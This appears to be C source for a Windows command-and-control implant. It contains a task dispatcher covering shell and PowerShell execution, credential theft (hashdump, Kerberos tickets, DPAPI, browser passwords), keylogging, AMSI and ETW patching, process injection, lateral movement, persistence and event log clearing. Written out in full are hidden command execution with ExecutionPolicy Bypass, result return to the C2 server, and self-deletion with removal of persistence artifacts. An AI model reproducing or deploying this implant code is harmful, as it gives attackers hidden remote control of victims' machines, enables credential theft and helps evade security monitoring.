#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"

// Output buffer implementation
POUTPUT_BUFFER output_new(DWORD initial_capacity) {
    POUTPUT_BUFFER buf = (POUTPUT_BUFFER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OUTPUT_BUFFER));
    if (!buf) return NULL;

    buf->data = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, initial_capacity);
    if (!buf->data) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }
    buf->capacity = initial_capacity;
    buf->size = 0;
    return buf;
}

BOOL output_write(POUTPUT_BUFFER buf, const BYTE *data, DWORD size) {
    if (!buf || !data) return FALSE;

    while (buf->size + size > buf->capacity) {
        DWORD new_cap = buf->capacity * 2;
        if (new_cap > MAX_OUTPUT_SIZE) return FALSE;
        BYTE *new_data = (BYTE *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf->data, new_cap);
        if (!new_data) return FALSE;
        buf->data = new_data;
        buf->capacity = new_cap;
    }

    CopyMemory(buf->data + buf->size, data, size);
    buf->size += size;
    return TRUE;
}

BOOL output_printf(POUTPUT_BUFFER buf, const char *fmt, ...) {
    char tmp[4096];
    va_list args;
    va_start(args, fmt);
    int len = _vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (len <= 0) return FALSE;
    return output_write(buf, (BYTE *)tmp, (DWORD)len);
}

void output_free(POUTPUT_BUFFER buf) {
    if (!buf) return;
    if (buf->data) HeapFree(GetProcessHeap(), 0, buf->data);
    HeapFree(GetProcessHeap(), 0, buf);
}

// Set result from output buffer (transfers ownership)
static void result_from_output(POUTPUT_BUFFER out, PC2_RESULT result) {
    if (out && out->size > 0) {
        result->data = out->data;
        result->data_size = out->size;
        out->data = NULL; // Transfer ownership
    }
    if (out) {
        HeapFree(GetProcessHeap(), 0, out);
    }
}

// Task dispatcher
BOOL task_dispatch(PIMPLANT_CONFIG config, PC2_TASK task, PC2_RESULT result) {
    if (task->data_size > MAX_TASK_DATA) {
        lstrcpynA(result->error, "task payload exceeds maximum size", sizeof(result->error));
        return FALSE;
    }

    switch (task->type) {
    case TASK_SLEEP:
        return task_sleep(config, task->data, task->data_size);
    case TASK_EXIT:
        return task_exit(config);
    case TASK_SELF_DELETE:
        return task_self_delete(config);
    case TASK_SHELL:
        return task_shell(task->data, task->data_size, result);
    case TASK_POWERSHELL:
        return task_powershell(task->data, task->data_size, result);
    case TASK_EXECUTE:
        return task_execute(task->data, task->data_size, result);
    case TASK_LS:
        return task_ls(task->data, task->data_size, result);
    case TASK_CD:
        return task_cd(task->data, task->data_size, result);
    case TASK_PWD:
        return task_pwd(result);
    case TASK_CAT:
        return task_cat(task->data, task->data_size, result);
    case TASK_UPLOAD:
        return task_upload(task->data, task->data_size, result);
    case TASK_DOWNLOAD:
        return task_download(task->data, task->data_size, result);
    case TASK_RM:
        return task_rm(task->data, task->data_size, result);
    case TASK_MKDIR:
        return task_mkdir_cmd(task->data, task->data_size, result);
    case TASK_PS:
        return task_ps(result);
    case TASK_KILL_PROCESS:
        return task_kill_process(task->data, task->data_size, result);
    case TASK_SOCKS_START:
        return task_socks_start(task->data, task->data_size, result);
    case TASK_SOCKS_STOP:
        return task_socks_stop(result);
    case TASK_PORTFWD_ADD:
        return task_portfwd_add(task->data, task->data_size, result);
    case TASK_PORTFWD_RM:
        return task_portfwd_remove(task->data, task->data_size, result);
    case TASK_RPORTFWD_ADD:
        return task_rportfwd_add(task->data, task->data_size, result);
    case TASK_RPORTFWD_REMOVE:
        return task_rportfwd_remove(task->data, task->data_size, result);
    case TASK_P2P_LISTEN:
        return task_p2p_listen(task->data, task->data_size, result);
    case TASK_P2P_CONNECT:
        return task_p2p_connect(task->data, task->data_size, result);
    case TASK_P2P_RELAY:
        return task_p2p_relay(task->data, task->data_size, result);
    case TASK_BOF:
        return task_bof(task->data, task->data_size, result);
    case TASK_SHELLCODE:
        return task_shellcode(task->data, task->data_size, result);
    case TASK_EXECUTE_ASSEMBLY:
        return task_execute_assembly(task->data, task->data_size, result);
    case TASK_INLINE_EXECUTE:
        return task_inline_execute(task->data, task->data_size, result);
    case TASK_CP:
        return task_cp(task->data, task->data_size, result);
    case TASK_MV:
        return task_mv(task->data, task->data_size, result);
    case TASK_TIMESTOMP:
        return task_timestomp(task->data, task->data_size, result);
    case TASK_SPAWN:
        return task_spawn(task->data, task->data_size, result);
    case TASK_INJECT:
        return task_inject(task->data, task->data_size, result);
    case TASK_MIGRATE:
        return task_migrate(task->data, task->data_size, result);
    case TASK_IFCONFIG:
        return task_ifconfig(task->data, task->data_size, result);
    case TASK_NETSTAT:
        return task_netstat(task->data, task->data_size, result);
    case TASK_PORTSCAN:
        return task_portscan(task->data, task->data_size, result);
    case TASK_TOKEN_STEAL:
        return task_token_steal(task->data, task->data_size, result);
    case TASK_MAKE_TOKEN:
        return task_make_token(task->data, task->data_size, result);
    case TASK_REVERT_TOKEN:
        return task_revert_token(task->data, task->data_size, result);
    case TASK_TOKEN_RUNAS:
        return task_token_runas(task->data, task->data_size, result);
    case TASK_HASHDUMP:
        return task_hashdump(task->data, task->data_size, result);
    case TASK_KERBEROS_TICKETS:
        return task_kerberos_tickets(task->data, task->data_size, result);
    case TASK_DPAPI:
        return task_dpapi(task->data, task->data_size, result);
    case TASK_LOGON_USER:
        return task_logon_user(task->data, task->data_size, result);
    case TASK_SLEEP_MASK:
        return task_sleep_mask(task->data, task->data_size, result);
    case TASK_UNHOOK:
        return task_unhook(task->data, task->data_size, result);
    case TASK_PATCH_ETW:
        return task_patch_etw(task->data, task->data_size, result);
    case TASK_PATCH_AMSI:
        return task_patch_amsi(task->data, task->data_size, result);
    case TASK_MODULE_STOMP:
        return task_module_stomp(task->data, task->data_size, result);
    case TASK_THREADLESS_INJECT:
        return task_threadless_inject(task->data, task->data_size, result);
    case TASK_LATERAL_PSEXEC:
        return task_lateral_psexec(task->data, task->data_size, result);
    case TASK_LATERAL_WMI:
        return task_lateral_wmi(task->data, task->data_size, result);
    case TASK_LATERAL_DCOM:
        return task_lateral_dcom(task->data, task->data_size, result);
    case TASK_LATERAL_WINRM:
        return task_lateral_winrm(task->data, task->data_size, result);
    case TASK_LATERAL_SCHTASK:
        return task_lateral_schtask(task->data, task->data_size, result);
    case TASK_PERSIST_REGISTRY:
        return task_persist_registry(task->data, task->data_size, result);
    case TASK_PERSIST_SERVICE:
        return task_persist_service(task->data, task->data_size, result);
    case TASK_PERSIST_SCHTASK:
        return task_persist_schtask(task->data, task->data_size, result);
    case TASK_PERSIST_COM:
        return task_persist_com(task->data, task->data_size, result);
    case TASK_PERSIST_DLL_SIDELOAD:
        return task_persist_dll_sideload(task->data, task->data_size, result);
    case TASK_SCREENSHOT:
        return task_screenshot(task->data, task->data_size, result);
    case TASK_KEYLOG_START:
        return task_keylog_start(task->data, task->data_size, result);
    case TASK_KEYLOG_STOP:
        return task_keylog_stop(task->data, task->data_size, result);
    case TASK_CLIPBOARD:
        return task_clipboard(task->data, task->data_size, result);
    case TASK_BROWSER_CREDS:
        return task_browser_creds(task->data, task->data_size, result);
    case TASK_DEFENSE_CLEAR_EVENTLOG:
        return task_defense_clear_eventlog(task->data, task->data_size, result);
    case TASK_ARP_SCAN:
        return task_arp_scan(task->data, task->data_size, result);
    default:
        lstrcpynA(result->error, "unknown task type", sizeof(result->error));
        return FALSE;
    }
}

void tasks_process_batch(PIMPLANT_CONFIG config, PC2_TASK tasks, DWORD count) {
    for (DWORD i = 0; i < count; i++) {
        C2_RESULT result;
        ZeroMemory(&result, sizeof(C2_RESULT));
        lstrcpynA(result.task_id, tasks[i].id, sizeof(result.task_id));

        BOOL ok = task_dispatch(config, &tasks[i], &result);

        if (result.data != NULL || result.error[0] != '\0' || ok) {
            if (result.data == NULL && result.error[0] == '\0') {
                PBYTE ack = (PBYTE)HeapAlloc(GetProcessHeap(), 0, 3);
                if (ack) {
                    CopyMemory(ack, "OK", 3);
                    result.data = ack;
                    result.data_size = 2;
                }
            }
            transport_send_result(config, &result);
        }

        if (tasks[i].data) {
            HeapFree(GetProcessHeap(), 0, tasks[i].data);
            tasks[i].data = NULL;
        }
        if (result.data) {
            HeapFree(GetProcessHeap(), 0, result.data);
            result.data = NULL;
        }

        if (!config->running) return;
    }
}

// --- Core tasks ---

BOOL task_sleep(PIMPLANT_CONFIG config, BYTE *data, DWORD size) {
    if (size >= 8) {
        DWORD *params = (DWORD *)data;
        config->sleep_seconds = params[0];
        config->jitter_percent = params[1];
    }
    return TRUE;
}

BOOL task_exit(PIMPLANT_CONFIG config) {
    config->running = FALSE;
    return TRUE;
}

static void cleanup_artifacts(void) {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegDeleteValueA(hkey, MUTEX_NAME);
        RegCloseKey(hkey);
    }

    char cmd[512];
    _snprintf(cmd, sizeof(cmd), "schtasks /Delete /TN \"%s\" /F", SERVICE_NAME);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char exec_cmd[560];
    _snprintf(exec_cmd, sizeof(exec_cmd), "cmd.exe /c %s", cmd);
    if (CreateProcessA(NULL, exec_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static void self_delete_immediate(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char newpath[MAX_PATH + 16];
    _snprintf(newpath, sizeof(newpath), "%s:oldstream", path);
    MoveFileA(path, newpath);

    HANDLE hFile = CreateFileA(newpath, DELETE, 0, NULL, OPEN_EXISTING,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
}

BOOL task_self_delete(PIMPLANT_CONFIG config) {
    config->running = FALSE;
    cleanup_artifacts();
    self_delete_immediate();
    return TRUE;
}

// --- Execution tasks ---

static BOOL run_command(const char *cmd, PC2_RESULT result) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        lstrcpynA(result->error, "CreatePipe failed", sizeof(result->error));
        return FALSE;
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdline[4096];
    _snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    BOOL created = CreateProcessA(
        NULL, cmdline, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    CloseHandle(hWritePipe);

    if (!created) {
        CloseHandle(hReadPipe);
        lstrcpynA(result->error, "CreateProcess failed", sizeof(result->error));
        return FALSE;
    }

    // Read output
    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);
    BYTE readBuf[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, readBuf, sizeof(readBuf), &bytesRead, NULL) && bytesRead > 0) {
        output_write(out, readBuf, bytesRead);
        if (out->size > MAX_OUTPUT_SIZE) break;
    }

    WaitForSingleObject(pi.hProcess, 30000);

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    result_from_output(out, result);
    return TRUE;
}

BOOL task_shell(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no command specified", sizeof(result->error));
        return FALSE;
    }

    // Null-terminate the command
    char *cmd = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!cmd) return FALSE;
    CopyMemory(cmd, data, size);

    BOOL ok = run_command(cmd, result);
    HeapFree(GetProcessHeap(), 0, cmd);
    return ok;
}

BOOL task_powershell(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no command specified", sizeof(result->error));
        return FALSE;
    }

    char *script = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!script) return FALSE;
    CopyMemory(script, data, size);

    // Build powershell command
    char cmdline[8192];
    _snprintf(cmdline, sizeof(cmdline),
              "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"%s\"",
              script);
    HeapFree(GetProcessHeap(), 0, script);

    // Use run_command with direct powershell invocation
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        lstrcpynA(result->error, "CreatePipe failed", sizeof(result->error));
        return FALSE;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL created = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWritePipe);

    if (!created) {
        CloseHandle(hReadPipe);
        lstrcpynA(result->error, "powershell launch failed", sizeof(result->error));
        return FALSE;
    }

    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);
    BYTE readBuf[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, readBuf, sizeof(readBuf), &bytesRead, NULL) && bytesRead > 0) {
        output_write(out, readBuf, bytesRead);
        if (out->size > MAX_OUTPUT_SIZE) break;
    }

    WaitForSingleObject(pi.hProcess, 60000);
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    result_from_output(out, result);
    return TRUE;
}

BOOL task_execute(BYTE *data, DWORD size, PC2_RESULT result) {
    return task_shell(data, size, result);
}
